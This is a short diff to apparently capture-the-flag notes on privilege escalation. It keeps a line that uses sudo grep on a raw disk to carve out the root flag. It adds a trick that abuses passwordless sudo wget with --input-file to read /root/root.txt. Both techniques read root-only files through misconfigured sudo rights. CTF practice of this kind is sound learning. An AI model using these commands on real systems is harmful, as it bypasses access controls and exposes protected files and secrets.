@@ -101,3 +101,7 @@ sudo grep -aPo '[a-fA-F0-9]{32}' /dev/sdb
 
 Above command will recover the root flag from /dev/sdb
 
+If wget commadn can be run as sudo without password, following command can be use to read flag:
+
+sudo wget --input-file /root/root.txt
+
